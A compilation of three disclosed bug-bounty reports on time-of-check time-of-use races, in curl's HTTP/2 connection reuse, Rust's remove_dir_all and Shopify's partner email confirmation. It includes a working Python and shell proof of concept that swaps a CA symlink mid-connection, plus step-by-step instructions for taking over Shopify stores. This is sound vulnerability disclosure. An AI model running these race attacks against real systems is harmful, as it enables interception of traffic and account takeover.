# Time-of-check Time-of-use (TOCTOU) Race Condition

_3 reports — High/Critical, disclosed_

### [TOCTOU Race Condition in HTTP/2 Connection Reuse Leads to Certificate Validation Bypass](https://hackerone.com/reports/3335085)

- **Report ID:** `3335085`
- **Severity:** High
- **Weakness:** Time-of-check Time-of-use (TOCTOU) Race Condition
- **Program:** curl
- **Reporter:** @0xrey
- **Bounty:** - usd
- **Disclosed:** 2025-09-11T16:10:49.578Z
- **CVE(s):** -

**Vulnerability Information:**

I've discovered a Time-of-Check to Time-of-Use (TOCTOU) vulnerability in how `libcurl` handles persistent HTTP/2 connections. During the initial handshake, `libcurl` correctly validates the server's certificate against the user-provided CA bundle. However, it then assumes this trust is permanent for the entire life of the connection.

If an attacker can modify the CA file on disk *after* this initial check, `libcurl` will continue to reuse the now-trusted connection for new HTTP/2 streams without ever re-validating its trust anchor. This allows an attacker to completely bypass certificate validation for all subsequent requests, enabling a full Man-in-the-Middle attack.

**Affected version:**

This vulnerability was confirmed on the latest stable release, **curl 8.16.0**, which I compiled from source to ensure the test was relevant. Given the nature of the bug, it likely affects all versions that support HTTP/2 connection reuse.

My test build's version output:
`curl 8.16.0 (x86_64-pc-linux-gnu) libcurl/8.16.0 OpenSSL/3.0.2 ... nghttp2/1.43.0`

**Steps To Reproduce:**

The following Proof of Concept demonstrates the vulnerability in a reliable way. It uses a Python script to orchestrate the test environment (compiling `curl`, setting up a server, and generating certificates) and then executes a small shell script to perform the actual attack.

**Step 1: Save and run the Proof of Concept code**
Save the code below as `poc.py` and run it with `python3 poc.py`. The script requires standard build tools (`build-essential`, etc.) and the `openssl` command-line tool.

```python
# Proof of Concept for Curl HTTP/2 TOCTOU Vulnerability
import threading, ssl, http.server, time, os, glob, sys, subprocess

def compile_curl():
    # Stage 1: Compile Curl 8.16.0 from source to ensure we test the latest version.
    print("--- STAGE 1: COMPILING CURL 8.16.0 ---")
    if os.path.exists("curl-8.16.0/src/curl"):
        print("Curl 8.16.0 already compiled.")
        return os.path.abspath("curl-8.16.0/src/curl")

    # Dependencies for Debian/Ubuntu can be installed with:
    # apt-get install -y build-essential libssl-dev libnghttp2-dev libpsl-dev
    
    subprocess.run("wget -q https://curl.se/download/curl-8.16.0.tar.gz && tar -xzf curl-8.16.0.tar.gz", shell=True, check=True)
    
    original_dir = os.getcwd()
    os.chdir("curl-8.16.0")
    print("\n--- Running ./configure ---")
    subprocess.run("./configure --with-openssl --with-nghttp2 > /dev/null", shell=True, check=True)
    print("--- Running make ---")
    subprocess.run("make > /dev/null", shell=True, check=True)
    
    curl_binary_path = os.path.abspath("src/curl")
    print("\n--- Verifying New Curl Version ---")
    subprocess.run(f"{curl_binary_path} --version", shell=True)
    os.chdir(original_dir)
    print("--- COMPILATION COMPLETE ---")
    return curl_binary_path

# Stage 2: Setup Server and Certificates
HOST = "localhost"
PORT = 8443
CA_FILE_PATH = "ca.crt"
SERVER_CERT_FILE = "server.crt"; SERVER_KEY_FILE = "server.key"
LEGIT_CA_CERT_FILE = "legit_ca.crt"; LEGIT_CA_KEY_FILE = "legit_ca.key"
FAKE_CA_CERT_FILE = "fake_ca.crt"; FAKE_CA_KEY_FILE = "fake_ca.key"

def cleanup_files():
    files_to_delete = glob.glob("*.crt") + glob.glob("*.key") + glob.glob("*.pem") + glob.glob("*.srl") + glob.glob("*.csr")
    for f in files_to_delete:
        try: os.remove(f)
        except: pass

def generate_all_certs():
    print("Generating certificates using OpenSSL CLI...")
    # Legit CA
    subprocess.run(f"openssl genrsa -out {LEGIT_CA_KEY_FILE} 2048", shell=True, check=True, capture_output=True)
    subprocess.run(f'openssl req -x509 -new -nodes -key {LEGIT_CA_KEY_FILE} -sha256 -days 365 -out {LEGIT_CA_CERT_FILE} -subj "/CN=Legit CA"', shell=True, check=True, capture_output=True)
    # Fake CA
    subprocess.run(f"openssl genrsa -out {FAKE_CA_KEY_FILE} 2048", shell=True, check=True, capture_output=True)
    subprocess.run(f'openssl req -x509 -new -nodes -key {FAKE_CA_KEY_FILE} -sha256 -days 365 -out {FAKE_CA_CERT_FILE} -subj "/CN=Fake CA"', shell=True, check=True, capture_output=True)
    # Server Cert (signed by Legit CA)
    subprocess.run(f"openssl genrsa -out {SERVER_KEY_FILE} 2048", shell=True, check=True, capture_output=True)
    subprocess.run(f'openssl req -new -key {SERVER_KEY_FILE} -out server.csr -subj "/CN={HOST}"', shell=True, check=True, capture_output=True)
    subprocess.run(f"openssl x509 -req -in server.csr -CA {LEGIT_CA_CERT_FILE} -CAkey {LEGIT_CA_KEY_FILE} -CAcreateserial -out {SERVER_CERT_FILE} -days 365 -sha256", shell=True, check=True, capture_output=True)
    print("Certificates created successfully.")

def run_server():
    class SimpleServer(http.server.SimpleHTTPRequestHandler):
        def do_GET(self):
            print(f"[SERVER LOG] Request received for: {self.path}")
            self.send_response(200)
            self.send_header("Content-type", "text/plain")
            self.end_headers()
            self.wfile.write(b"OK")
        def log_message(self, format, *args):
            return # Suppress default logging

    print(f"[SERVER] Listening at https://{HOST}:{PORT}")
    httpd = http.server.HTTPServer((HOST, PORT), SimpleServer)
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.set_alpn_protocols(['h2', 'http/1.1']) # Enable ALPN for HTTP/2 negotiation
    ctx.load_cert_chain(certfile=SERVER_CERT_FILE, keyfile=SERVER_KEY_FILE)
    httpd.socket = ctx.wrap_socket(httpd.socket, server_side=True)
    httpd.serve_forever()

# --- Main Execution ---
try:
    CURL_BINARY_PATH = compile_curl()
    cleanup_files()
    generate_all_certs()

    server_thread = threading.Thread(target=run_server)
    server_thread.daemon = True
    server_thread.start()
    time.sleep(2)

    os.symlink(LEGIT_CA_CERT_FILE, CA_FILE_PATH)

    attack_script = f"""
    #!/bin/bash
    set -e
    echo -e "\\n--- STARTING ATTACK (Testing Curl 8.16.0) ---"

    # Attacker process: swap the symlink after a short delay
    (
      sleep 0.5
      echo "[ATTACKER] Swapping symlink to Fake CA!"
      rm -f {CA_FILE_PATH}
      ln -s {FAKE_CA_CERT_FILE} {CA_FILE_PATH}
    ) &

    # Victim process: curl with two requests, forcing HTTP/2
    {CURL_BINARY_PATH} --http2 -v \\
      --cacert {CA_FILE_PATH} https://{HOST}:{PORT}/secure/data1 \\
      --cacert {CA_FILE_PATH} https://{HOST}:{PORT}/secure/data2
    """

    with open("attack.sh","w") as f:
        f.write(attack_script)
    os.chmod("attack.sh", 0o755)

    print("\n--- Running Attack against Curl 8.16.0 ---")
    subprocess.run("./attack.sh", shell=True)

    print("\n--- Final Analysis ---")
    print("Review the output above. If the curl command succeeded and the server log shows two requests, the bug is confirmed in 8.16.0.")

except Exception as e:
    print(f"An error occurred: {e}")
    print("Please ensure build tools (build-essential, etc.) and OpenSSL CLI are installed.")
```

**Step 2: Observe the output**
The script orchestrates a race condition:
a. It creates a symlink `ca.crt` pointing to a legitimate CA file.
b. It launches a background process that, after a brief pause, atomically replaces this symlink to point to a fake CA file.
c. It immediately runs a single `curl` command that makes two requests over HTTP/2, forcing connection reuse.

**Expected (Secure) Behavior:**
The first request should succeed. The second request, however, should fail with an SSL certificate verification error (exit code 60). A secure implementation would either re-evaluate the trust anchor for the new stream or create a new connection which would then fail validation against the swapped-in fake CA.

**Actual (Vulnerable) Behavior:**
Both requests succeed. The `curl` command exits cleanly. The verbose output explicitly shows `Re-using existing connection!`, and the server log confirms both requests were received. This is definitive proof that `curl` does not re-validate the trust anchor for the second stream, instead blindly sending it over the previously established trusted connection.

## Impact

This vulnerability allows a local attacker to completely bypass TLS certificate validation for all but the first request on a long-lived HTTP/2 connection. This breaks the trust model of TLS and enables Man-in-the-Middle (MitM) attacks, compromising the confidentiality and integrity of sensitive data.

I've rated this as **High** severity. While the attack vector is local, the impact is a catastrophic failure of TLS guarantees (full MitM). The "local" prerequisite is met in many common, real-world scenarios beyond a simple desktop user, such as:
*   Multi-tenant servers and shared hosting environments.
*   Compromised container environments with shared volumes.
*   Applications that insecurely use world-writable directories like `/tmp` for trust stores.
*   As a powerful escalation step in a vulnerability chain, where a lower-impact bug (like a limited file write) can be escalated to a full network MitM.

The impact is most severe for long-running applications, daemons, or API clients that rely on persistent HTTP/2 connections, as the window of opportunity for the attacker is indefinite after the first connection is made.

---

### [Time-of-check to time-of-use vulnerability in the std::fs::remove_dir_all() function of the Rust standard library](https://hackerone.com/reports/1520931)

- **Report ID:** `1520931`
- **Severity:** High
- **Weakness:** Time-of-check Time-of-use (TOCTOU) Race Condition
- **Program:** Internet Bug Bounty
- **Reporter:** @hkratz
- **Bounty:** 4000 usd
- **Disclosed:** 2022-03-24T18:09:51.838Z
- **CVE(s):** CVE-2022-21658

**Vulnerability Information:**

The implementation of [`std::fs::remove_dir_all()`](https://doc.rust-lang.org/std/fs/fn.remove_dir_all.html) in the Rust standard library is vulnerable to a time-of-check to time-of-use link replacement attack. This applies to all versions of Rust before 1.58.1.

### Vulnerability details
The [documentation of `std::fs::remove_dir_all()`](https://doc.rust-lang.org/std/fs/fn.remove_dir_all.html) guarantees that the function does not follow symbolic links:
> Removes a directory at this path, after removing all its contents. Use carefully!
> This function does not follow symbolic links and it will simply remove the symbolic link itself.

The vulnerable implementation for Windows is in [library/std/src/sys/windows/fs.rs](https://github.com/rust-lang/rust/blob/1.58.0/library/std/src/sys/windows/fs.rs#L755-L779). For other platforms it is in [library/std/src/sys_common/fs.rs](https://github.com/rust-lang/rust/blob/1.58.0/library/std/src/sys_common/fs.rs#L28-L43). Both use a `remove_dir_all_recursive()` helper function which does the actual recursion and deletion. It opens directory by the given path and iterates the directory entries. For each directory entry it checks if the entry is a directory and recurses into it if it is. If it is not it is deleted using `std::fs::remove_file()`. On the way back up the now empty directories are deleted using `std::fs::remove_dir()`

There are two problems with this implementation if the attacker has write access to a directory which is being deleted by the privileged process:

1. The type of a directory entry is checked and it is being recursed into if it is a directory. There is a short time window between the check and the opening of the subdirectory which an attacker can exploit by replacing the subdirectory with symlink causing the symlink to be followed.

2. The path given to  `std::fs::remove_dir_all()` is extended with subentry paths which are then used to process subdirectories and delete directory entries. Paths are resolved by the operating system each time they are passed to a system call. If the attacker can replace a  descendent directory of the directory  passed to `remove_dir_all()` while a subdirectory of it is being processed with a symlink he can cause that symlink to be followed in subsequent filesystem operations.

A proof-of-concept code demonstrating the vulnerability is attached.

### Mitigation
* Update to Rust 1.58.1 or later which includes a fixed implementation for all supported platforms except for macOS before version 10.10 and REDOX.
* Don't use the vulnerable `std::fs::remove_dir_all()` in a privileged process or any other security-senstitive context.
* Make sure that `std::fs::remove_dir_all()` is only used on directories not accessible to processes from other security contexts.

## Impact

If the attacker has write access to a directory which is being deleted by the privileged process using `remove_dir_all()` he can trick the process to delete any sensitive files or directory subtrees that the privileged process can.

**Summary (team):**

Race condition in std::fs::remove_dir_all
Description
This is a cross-post of the official security advisory. The official advisory contains a signed version with our PGP key, as well.

The Rust Security Response WG was notified that the std::fs::remove_dir_all
standard library function is vulnerable a race condition enabling symlink
following (CWE-363). An attacker could use this security issue to trick a
privileged program into deleting files and directories the attacker couldn't
otherwise access or delete.

This issue has been assigned CVE-2022-21658.

Overview
Let's suppose an attacker obtained unprivileged access to a system and needed
to delete a system directory called sensitive/, but they didn't have the
permissions to do so. If std::fs::remove_dir_all followed symbolic links,
they could find a privileged program that removes a directory they have access
to (called temp/), create a symlink from temp/foo to sensitive/, and wait
for the privileged program to delete foo/. The privileged program would
follow the symlink from temp/foo to sensitive/ while recursively deleting,
resulting in sensitive/ being deleted.

To prevent such attacks, std::fs::remove_dir_all already includes protection
to avoid recursively deleting symlinks, as described in its documentation:

This function does not follow symbolic links and it will simply remove
the symbolic link itself.

Unfortunately that check was implemented incorrectly in the standard library,
resulting in a TOCTOU (Time-of-check Time-of-use) race condition. Instead of
telling the system not to follow symlinks, the standard library first checked
whether the thing it was about to delete was a symlink, and otherwise it would
proceed to recursively delete the directory.

This exposed a race condition: an attacker could create a directory and replace
it with a symlink between the check and the actual deletion. While this attack
likely won't work the first time it's attempted, in our experimentation we were
able to reliably perform it within a couple of seconds.

Affected Versions
Rust 1.0.0 through Rust 1.58.0 is affected by this vulnerability. We're going
to release Rust 1.58.1 later today, which will include mitigations for this
vulnerability. Patches to the Rust standard library are also available for
custom-built Rust toolchains here.

Note that the following targets don't have usable APIs to properly mitigate the
attack, and are thus still vulnerable even with a patched toolchain:

macOS before version 10.10 (Yosemite)
REDOX
Mitigations
We recommend everyone to update to Rust 1.58.1 as soon as possible, especially
people developing programs expected to run in privileged contexts (including
system daemons and setuid binaries), as those have the highest risk of being
affected by this.

Note that adding checks in your codebase before calling remove_dir_all will
not mitigate the vulnerability, as they would also be vulnerable to race
conditions like remove_dir_all itself. The existing mitigation is working as
intended outside of race conditions.

Acknowledgments
We want to thank Hans Kratz for independently discovering and disclosing this
issue to us according to the Rust security policy, for developing the fix
for UNIX-like targets and for reviewing fixes for other platforms.

We also want to thank Florian Weimer for reviewing the UNIX-like fix and for
reporting the same issue back in 2018, even though the Security Response WG
didn't realize the severity of the issue at the time.

Finally we want to thank Pietro Albini for coordinating the security response
and writing this advisory, Chris Denton for writing the Windows fix, Alex
Crichton for writing the WASI fix, and Mara Bos for reviewing the patches.

https://github.com/rust-lang/rust/security/advisories/GHSA-r9cc-f5pr-p3j2

---

### [Ability to bypass partner email confirmation to take over any store given an employee email](https://hackerone.com/reports/300305)

- **Report ID:** `300305`
- **Severity:** Critical
- **Weakness:** Time-of-check Time-of-use (TOCTOU) Race Condition
- **Program:** Shopify
- **Reporter:** @cache-money
- **Bounty:** 15250 usd
- **Disclosed:** 2018-02-07T13:28:31.959Z
- **CVE(s):** -

**Vulnerability Information:**

I told Pete I would take a look at Spotify, hi Pete.

**Summary**
It's possible to take over any store account through partners given an employee email address. This is possible because I found a way to confirm arbitrary emails. I don't know the Shopify ecosystem well enough to know the other ramifications of such a bug.

On #270981 you wrote:
> The intention was that, when a partner already had a valid user account on the store, their collaborator account request could be accepted automatically, with the user account converted into a collaborator account.

I tested that functionality and confirmed how it works. I realized that if you can somehow create a partner account with a business email that matched that of an employee, you would be able to take over their employee account, then convert it to a collaborator. The problem is that business accounts need emails to be validated, but this can be bypassed with a race condition.

The bug works by hitting the email validation endpoint for an email you own, at the same time as changing your email to a victim's. It might take a few tries, but eventually your email will be changed and be validated due to not (properly) using a DB transaction.

**Steps to reproduce**
1. Create a store account and invite an employee.
2. Accept the employee invite (maybe not necessary I didn't test).
3. Login to or create a partner account as the attacker.
4. Go to your partner settings page `https://partners.shopify.com/[ID]/settings` and change your email to something you own.
5. Check your email and grab the confirmation link, but don't visit it yet.
6. Go back to your partner account and change your email to that of the store employee from step 2, but intercept the request to not let it through yet.
7. Now the tricky part. The "change email" takes anywhere from 1,100 - 2,500 ms to load so you need to take that into account. But let the request go through, wait for some milliseconds, then in another tab visit that email confirmation link from step 5.
8. If done correctly you will now have confirmed an email you do not own.
9. Visit `https://partners.shopify.com/[ID]/managed_stores`, add the store, and you now have access.

As proof, look at the email for partner account `698396`. It will be confirmed `cache@hackerone.com`, which I obviously would never be able to validate otherwise.

Thanks,
-- Tanner

## Impact

Ability to take over stores, and possibly perform any other action that relies on a validated email as a security measure.

**Summary (team):**

@cache-money reported it was possible to bypass the email verification process in our Partners Dashboard. Doing so would have allowed a Partner to request access to a store under an email address the Partner did not own. If the store had a staff account associated with that email address, the staff account would have been automatically converted to a "collaborator" account and added to the Partner's dashboard without any merchant interaction. 

We tracked down the bug to a race condition in the logic for changing and verifying email addresses. We fixed it by locking the database record during those actions and requiring store administrators to approve all collaborator requests.

**Summary (researcher):**

After reading Shopify's summary from #270981 a few of times I was able to replicate the intended behavior. Seeing how it worked, I realized the core behavior to investigate was the automatic conversion aspect of it. In order for the conversion to work, you needed to confirm a store employee's email on a partner account. From there you could add the store on the partner account as a "managed store", which will then perform the automatic conversion and give you collaborator access. The bug existed in the email confirmation, which allowed me to confirm arbitrary emails under my partner account via race condition.

The bug was filed on Christmas Eve, and within 12 hours the Shopify team rolled out a fix to address the immediate issue. It was a pleasure to work with a team that takes security as seriously as they do.

---
